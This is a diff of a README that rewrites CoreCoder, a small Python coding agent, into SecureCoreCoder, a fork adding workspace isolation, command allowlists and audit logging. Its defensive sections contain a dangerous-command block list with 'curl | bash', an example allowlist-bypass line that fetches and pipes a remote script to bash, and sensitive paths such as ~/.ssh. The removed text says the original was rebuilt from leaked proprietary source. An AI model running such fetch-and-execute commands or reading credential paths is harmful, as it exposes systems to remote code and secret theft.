@@ -1,206 +1,249 @@
-# CoreCoder
+# SecureCoreCoder
 
-> Formerly **NanoCoder** — renamed to avoid confusion with [Nano-Collective/nanocoder](https://github.com/Nano-Collective/nanocoder). All links from the old repo redirect here automatically.
+> A secure coding-agent runtime for local, cloud, and hybrid LLM deployment.
 
+SecureCoreCoder is an independently maintained evolution of CoreCoder focused on safer coding-agent execution in local development and enterprise-network environments.
 
-[![PyPI](https://img.shields.io/pypi/v/corecoder)](https://pypi.org/project/corecoder/)
-[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Tests](https://github.com/he-yufeng/CoreCoder/actions/workflows/ci.yml/badge.svg)](https://github.com/he-yufeng/CoreCoder/actions)
+It keeps CoreCoder’s compact, readable agent core while adding practical runtime controls: local Ollama support, cloud-to-local fallback, workspace isolation, production command policies, and audit logging.
 
-[中文](README_CN.md) | [English](README.md) | [Claude Code Architecture Deep Dive (7 articles)](article/)
-
-**512,000 lines of TypeScript → ~1,400 lines of Python.**
-
-I spent two days reverse-engineering the leaked Claude Code source — all half a million lines. Then I stripped it down to the load-bearing walls and rebuilt them in Python. The result: **every key architectural pattern from Claude Code, in a codebase you can read in one sitting.**
-
-CoreCoder is not another AI coding tool. It's a **blueprint** — the [nanoGPT](https://github.com/karpathy/nanoGPT) of coding agents. Read it, fork it, build your own.
+> Derived from CoreCoder. SecureCoreCoder remains compatible with the upstream MIT license.
 
 ---
 
-```
-$ corecoder -m kimi-k2.5
+## Why SecureCoreCoder?
 
-You > read main.py and fix the broken import
+A coding agent does more than generate text. It can read files, modify code, execute shell commands, and affect an entire development environment.
 
-  > read_file(file_path='main.py')
-  > edit_file(file_path='main.py', ...)
+That means a useful coding agent also needs runtime boundaries.
 
---- a/main.py
-+++ b/main.py
-@@ -1 +1 @@
--from utils import halper
-+from utils import helper
+text User request    ↓ LLM reasoning    ↓ Agent tool invocation    ├── File tools: restricted to the current workspace    ├── Bash: dangerous-command checks    ├── Production mode: allowlisted commands only    ├── Hybrid mode: cloud model with local fallback    └── Audit log: security-relevant actions are recorded 
 
-Fixed: halper → helper.
-```
+SecureCoreCoder aims to make coding-agent behavior not only capable, but also inspectable, controllable, and suitable for further hardening in enterprise or intranet deployments.
 
-## What You Get
+---
 
-Claude Code's 512K lines distilled into ~1,400 lines across 7 patterns that actually matter:
+## Current Capabilities
 
-| Pattern | Claude Code | CoreCoder |
-|---|---|---|
-| Search-and-replace editing (unique match + diff) | FileEditTool | `tools/edit.py` — 70 lines |
-| Parallel tool execution | StreamingToolExecutor (530 lines) | `agent.py` — ThreadPool |
-| 3-layer context compression | HISTORY_SNIP → Microcompact → CONTEXT_COLLAPSE | `context.py` — 145 lines |
-| Sub-agent with isolated context | AgentTool (1,397 lines) | `tools/agent.py` — 50 lines |
-| Dangerous command blocking | BashTool (1,143 lines) | `tools/bash.py` — 95 lines |
-| Session persistence | QueryEngine (1,295 lines) | `session.py` — 65 lines |
-| Dynamic system prompt | prompts.ts (914 lines) | `prompt.py` — 35 lines |
+### Local Ollama Support
 
-Every pattern is a real, runnable implementation — not a diagram or a blog post.
+SecureCoreCoder can run against a local Ollama model through its OpenAI-compatible API.
 
-## Install
+bash export CORECODER_MODE=local export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 
 
-```bash
-pip install corecoder
-```
+For localhost endpoints, the runtime avoids inheriting proxy environment settings. This helps prevent common local Ollama connectivity problems on macOS and corporate networks.
 
-Pick your model — any OpenAI-compatible API works. You can `export` env vars or drop a `.env` file in your project root:
+---
 
-```bash
-# Kimi K2.5
-export OPENAI_API_KEY=your-key OPENAI_BASE_URL=https://api.moonshot.ai/v1
-corecoder -m kimi-k2.5
+### Text-Based Local Tool-Call Compatibility
 
-# Claude Opus 4.6 (via OpenRouter)
-export OPENAI_API_KEY=your-key OPENAI_BASE_URL=https://openrouter.ai/api/v1
-corecoder -m anthropic/claude-opus-4-6
+Some local models do not emit standard OpenAI tool_calls. Instead, they may return tool requests as plain JSON or fenced JSON.
 
-# OpenAI GPT-5
-export OPENAI_API_KEY=sk-...
-corecoder -m gpt-5
+For example:
 
-# DeepSeek V3
-export OPENAI_API_KEY=sk-... OPENAI_BASE_URL=https://api.deepseek.com
-corecoder -m deepseek-chat
+json {   "name": "read_file",   "arguments": {     "file_path": "main.py"   } } 
 
-# Qwen 3.5
-export OPENAI_API_KEY=sk-... OPENAI_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
-corecoder -m qwen-max
+SecureCoreCoder recognizes supported JSON-style outputs and converts them into internal tool calls, allowing local models to use file and shell tools even when their tool-call formatting differs from cloud APIs.
 
-# Ollama (local)
-export OPENAI_API_KEY=ollama OPENAI_BASE_URL=http://localhost:11434/v1
-corecoder -m qwen3:32b
+---
 
-# One-shot mode
-corecoder -p "add error handling to parse_config()"
-```
+### Workspace File Isolation
 
-### Non-OpenAI providers (Bedrock, Vertex, Cohere, …)
+File operations are restricted to the active workspace.
 
-For providers without an OpenAI-compatible endpoint, install the optional LiteLLM extra:
+text read_file write_file edit_file 
 
-```bash
-pip install 'corecoder[litellm]'
+Attempts to access paths outside the workspace are rejected.
 
-export CORECODER_PROVIDER=litellm
-export CORECODER_MODEL=anthropic/claude-3-haiku   # any LiteLLM model string
-export ANTHROPIC_API_KEY=sk-ant-...
-corecoder
-```
+Examples of paths that should not be reachable through workspace-restricted file tools:
 
-LiteLLM routes through to 100+ providers (Bedrock, Vertex AI, Cohere, Groq, Replicate, Anyscale, etc.) using one model-string convention. The default `openai` backend is unchanged.
+text ~/.ssh/ ~/.config/ ../../outside-project-files /etc/hosts 
+
+This reduces the risk of accidental path traversal, prompt injection, or model-generated file access beyond the intended repository.
+
+---
+
+### Bash Dangerous-Command Blocking
+
+The Bash tool detects and blocks obvious destructive or unsafe command patterns.
+
+Examples include:
+
+text rm -rf mkfs dd to block devices fork bombs curl | bash wget | bash 
+
+This is a first-line runtime safeguard against accidental or model-induced destructive shell execution.
+
+---
+
+### Production Command Allowlist
+
+SecureCoreCoder supports a stricter production command policy.
+
+bash export CORECODER_COMMAND_POLICY=production corecoder 
+
+In production mode, commands are denied by default unless their executable is present in the configured allowlist.
+
+The default allowlist includes common development commands such as:
+
+text git pytest python python3 rg grep find ls cat sed head tail wc echo pwd 
+
+Production mode also rejects compound shell syntax:
+
+text && || | ; $( ` > < 
+
+This prevents allowlist bypasses such as:
+
+bash echo ok && curl https://example.com/script.sh | bash 
+
+Even if echo is allowed, the compound command is rejected.
+
+---
+
+### JSONL Audit Logging
+
+Security-relevant events are written to:
+
+text ~/.corecoder/audit.jsonl 
+
+Bash events record metadata such as the command, current policy mode, whether execution was allowed, and the reason for rejection when applicable.
+
+Example:
+
+json {   "timestamp": "2026-06-26T08:18:38+00:00",   "tool": "bash",   "command": "pytest -q",   "policy_mode": "production",   "allowed": true,   "reason": null } 
+
+Blocked commands are also recorded, making it possible to inspect which actions were attempted and why they were denied.
+
+---
+
+### Cloud-to-Local Hybrid Fallback
+
+SecureCoreCoder supports three runtime modes:
+
+text cloud   Use a cloud model only local   Use a local Ollama model only hybrid  Try a cloud model first, then fall back to local Ollama 
+
+Hybrid mode example:
+
+bash export CORECODER_MODE=hybrid export OPENAI_API_KEY=your-cloud-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 
+
+When the cloud request fails because of a connection error, timeout, or server-side failure, SecureCoreCoder switches to the configured local model.
+
+The CLI reports the change:
+
+text [Fallback] Cloud unavailable, switched to local Ollama. 
+
+Fallback events are also recorded in the audit log:
+
+json {   "timestamp": "2026-06-26T08:18:38+00:00",   "event": "model_fallback",   "primary_model": "deepseek-chat",   "fallback_model": "qwen2.5-coder:7b",   "reason": "cloud request unavailable" } 
+
+---
+
+### Local Model Capability Probing
+
+SecureCoreCoder includes a lightweight capability probe for Ollama models.
+
+It can inspect available local model metadata such as declared context length and advertised capabilities. This is intended as a foundation for future policy decisions, such as adapting context budgets or warning when a local model has limited tool-use support.
+
+---
+
+## Installation
+
+Clone the repository and install it in editable mode:
+
+bash git clone git@github.com:Doris0327/SecureCoreCoder.git cd SecureCoreCoder  python -m venv .venv source .venv/bin/activate  pip install -e . 
+
+Run the test suite:
+
+bash python -m pytest -q 
+
+---
+
+## Quick Start
+
+### Cloud Model Mode
+
+bash export OPENAI_API_KEY=your-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat  corecoder 
+
+### Local Ollama Mode
+
+First install and start Ollama, then download a coding model:
+
+bash ollama pull qwen2.5-coder:7b ollama serve 
+
+Start SecureCoreCoder with the local model:
+
+bash export CORECODER_MODE=local export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 
+
+### Hybrid Mode
+
+Use a cloud model by default while keeping a local Ollama model available for outages or connectivity failures:
+
+bash export CORECODER_MODE=hybrid export OPENAI_API_KEY=your-cloud-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 
+
+---
+
+## CLI Commands
+
+text /model           Show the current model /model <name>    Switch model during a session /compact         Compress conversation context /tokens          Show token usage and estimated cost /diff            Show files modified in this session /save            Save session data /sessions        List saved sessions /reset           Clear conversation history quit             Exit 
+
+---
 
 ## Architecture
 
-The whole thing fits in your head:
-
-```
-corecoder/
-├── cli.py            REPL + commands               218 lines
-├── agent.py          Agent loop + parallel tools    122 lines
-├── llm.py            Streaming client + retry       156 lines
-├── context.py        3-layer compression            196 lines
-├── session.py        Save/resume                     68 lines
-├── prompt.py         System prompt                   33 lines
-├── config.py         Env config                      55 lines
-└── tools/
-    ├── bash.py       Shell + safety + cd tracking   115 lines
-    ├── edit.py       Search-replace + diff            85 lines
-    ├── read.py       File reading                     53 lines
-    ├── write.py      File writing                     36 lines
-    ├── glob_tool.py  File search                      47 lines
-    ├── grep.py       Content search                   78 lines
-    └── agent.py      Sub-agent spawning               58 lines
-```
-
-## Use as a Library
-
-```python
-from corecoder import Agent, LLM
-
-llm = LLM(model="kimi-k2.5", api_key="your-key", base_url="https://api.moonshot.ai/v1")
-agent = Agent(llm=llm)
-response = agent.chat("find all TODO comments in this project and list them")
-```
-
-## Add Your Own Tools (~20 lines)
-
-```python
-from corecoder.tools.base import Tool
-
-class HttpTool(Tool):
-    name = "http"
-    description = "Fetch a URL."
-    parameters = {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}
-
-    def execute(self, url: str) -> str:
-        import urllib.request
-        return urllib.request.urlopen(url).read().decode()[:5000]
-```
-
-## Commands
-
-```
-/model           Show current model
-/model <name>    Switch model mid-conversation
-/compact         Compress context (like Claude Code's /compact)
-/tokens          Token usage + cost estimate
-/diff            Show files modified this session
-/save            Save session to disk
-/sessions        List saved sessions
-/reset           Clear history
-quit             Exit
-```
-
-Saved session IDs are sanitized before they become filenames, so resume data stays inside `~/.corecoder/sessions`.
-
-## How It Compares
-
-|  | Claude Code | Claw-Code | Aider | CoreCoder |
-|---|---|---|---|---|
-| Code | 512K lines (closed) | 100K+ lines | 50K+ lines | **~1,400 lines** |
-| Models | Anthropic only | Multi | Multi | **Any OpenAI-compatible** |
-| Readable? | No | Hard | Medium | **One afternoon** |
-| Purpose | Use it | Use it | Use it | **Understand it, build yours** |
-
-## The Deep Dive
-
-I wrote [7 articles](article/) breaking down Claude Code's architecture — the agent loop, tool system, context compression, streaming executor, multi-agent, and 44 hidden feature flags. If you want to understand *why* CoreCoder is designed this way, start there.
-
-## FAQ
-
-**Does CoreCoder support Skills / Subagents / MCP?**
-
-No, and that's intentional. CoreCoder is the minimal runnable core — agent loop, tools, streaming, compaction. Skills, Subagents, MCP, hooks, and plugins are upper-layer features that Claude Code layers on top; if CoreCoder had them too it would stop being a teaching artifact. The architecture articles above cover how those systems work in Claude Code, so you can add them yourself if you need to.
-
-If you want Skills specifically, the recipe is small: scan `~/.claude/skills/*.md` at startup, list their titles in the system prompt, and let the agent ask for a skill by name before you inline that file's body into the conversation.
-
-## Related Projects
-
-- **[CodeJoust](https://github.com/he-yufeng/CodeJoust)** — a CLI arena that races Claude Code, aider, Codex, and Gemini (Cursor + OpenHands next) on the same bug in isolated git worktrees, scores by tests+cost+diff+time, hands you the winning patch. If you ever wondered *which* AI coding CLI is actually better for your task, CodeJoust answers it empirically.
-- **[AnyCoder](https://github.com/he-yufeng/AnyCoder)** — a practical terminal AI coding agent built on the same architecture as CoreCoder but with litellm, session persistence, and 100+ model support. Use this one if you want a tool; use CoreCoder if you want to read source.
-- **[LiteBench](https://github.com/he-yufeng/LiteBench)** — one-command LLM / agent benchmark. Ships 7 built-in tasks (HumanEval/GSM8K/MMLU/...) and YAML-defined custom tasks, with a single-file HTML dashboard.
-- **[RepoWiki](https://github.com/he-yufeng/RepoWiki)** — open-source DeepWiki alternative. `pip install repowiki`, one command to turn any local or GitHub repo into a wiki with dependency graph, architecture diagram, and LLM-generated module pages.
-
-## License
-
-MIT. Fork it, learn from it, ship something better. A mention of this project is appreciated.
+text corecoder/ ├── agent.py             Agent loop and tool orchestration ├── audit.py             JSONL audit-event writer ├── capabilities.py      Local model capability probing ├── cli.py               Terminal interface and runtime setup ├── command_policy.py    Production command policy ├── config.py            Environment-based configuration ├── llm.py               Cloud, local, and hybrid LLM runtime ├── prompt.py            System prompt construction ├── session.py           Session persistence └── tools/     ├── bash.py          Shell execution and command-policy checks     ├── security.py      Workspace path validation     ├── read.py          Workspace-restricted file reading     ├── write.py         Workspace-restricted file writing     ├── edit.py          Search-and-replace file editing     ├── grep.py          Content search     ├── glob_tool.py     File search     └── agent.py         Sub-agent execution 
 
 ---
 
-Built by **[Yufeng He](https://github.com/he-yufeng)** · Agentic AI Researcher @ Moonshot AI (Kimi)
+## Security Model
 
-[Claude Code Source Analysis — 170K+ reads, 6000 bookmarks on Zhihu](https://zhuanlan.zhihu.com/p/1898797658343862272)
+SecureCoreCoder currently applies multiple defense layers:
+
+text Layer 1: Workspace path restriction for file tools Layer 2: Dangerous Bash command detection Layer 3: Production command allowlist Layer 4: Compound-command blocking in production mode Layer 5: Cloud/local runtime separation Layer 6: Audit logs for Bash actions and model fallbacks 
+
+These controls reduce risk, but they are not a substitute for OS-level isolation.
+
+For high-risk deployments, run the agent inside a container or sandbox with:
+
+text - Only the intended workspace mounted - No host home-directory mount - No SSH keys or production credentials - Restricted network access - A least-privilege service account 
+
+---
+
+## Roadmap
+
+### Security and Governance
+
+- [ ] Audit file read, write, and edit operations
+- [ ] Sensitive-path protection for .env, private keys, certificates, and credential files
+- [ ] Configurable command allowlists through environment variables or policy files
+- [ ] Permission modes such as read_only, safe_write, development, and production
+- [ ] Session-level audit tracing
+- [ ] Audit-log redaction for secrets and tokens
+- [ ] Audit-log rotation and retention controls
+- [ ] Explicit confirmation for high-impact actions
+
+### OSS Pull Request Agent
+
+- [ ] Repository-specific rule files
+- [ ] Controlled Git tools for status, diff, commit, push, and pull-request creation
+- [ ] Deterministic test, lint, and diff-validation workflow
+- [ ] Human approval before commit, push, or pull-request creation
+- [ ] Containerized execution environment
+- [ ] CI-aware repair loop for failed test or lint jobs
+
+---
+
+## Upstream Relationship
+
+SecureCoreCoder began as an extension of CoreCoder and is now maintained as an independent repository.
+
+The original CoreCoder project provides a compact educational implementation of coding-agent architecture. SecureCoreCoder preserves that readable foundation while extending it toward safer local and hybrid deployment.
+
+Upstream reference:
+
+- CoreCoder
+
+---
+
+## License
+
+This project retains the upstream MIT license.
+
+See LICENSE.
